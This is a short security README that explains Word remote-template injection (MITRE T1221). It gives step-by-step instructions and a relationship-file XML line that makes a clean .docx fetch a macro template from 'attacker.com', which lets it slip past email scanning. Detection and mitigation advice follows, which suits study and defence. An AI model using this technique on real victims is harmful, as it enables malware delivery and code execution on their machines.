# Template Injection Attack

> **⚠️ DISCLAIMER**: Educational purposes ONLY. Do not use without authorization.

## Overview
A clean Word document references a remote .dotm template in its relationship file.
When opened, Word automatically fetches and loads the template — which contains malicious macros.
The initial document passes email scanning because it contains no macros.

## How It Works
```
1. Create: malicious_template.dotm (contains VBA macro with payload)
2. Host: malicious_template.dotm on attacker web server
3. Create: clean_document.docx with modified _rels/settings.xml.rels:
   <Relationship Type=".../attachedTemplate" 
     Target="http://attacker.com/malicious_template.dotm" TargetMode="External"/>
4. Deliver: clean_document.docx (no macros → passes email scanning)
5. Execute: On open, Word fetches template and macros execute
```

## MITRE ATT&CK
- **T1221** — Template Injection (Defense Evasion)
- **T1059.005** — Visual Basic (Execution)
- **T1105** — Ingress Tool Transfer (Command and Control)

## Detection
- Inspect .rels files in Office documents for external template references
- Monitor network connections from WINWORD.EXE to external hosts
- Alert on .dotm file downloads from unusual sources

## Mitigation
- Configure Office to not automatically load external templates
- Network controls blocking WINWORD.EXE outbound connections
- Group Policy to restrict template loading from internet

## Files
- `template-inject.py` — Script demonstrating how to modify document relationships

## References
- [MITRE T1221](https://attack.mitre.org/techniques/T1221/)
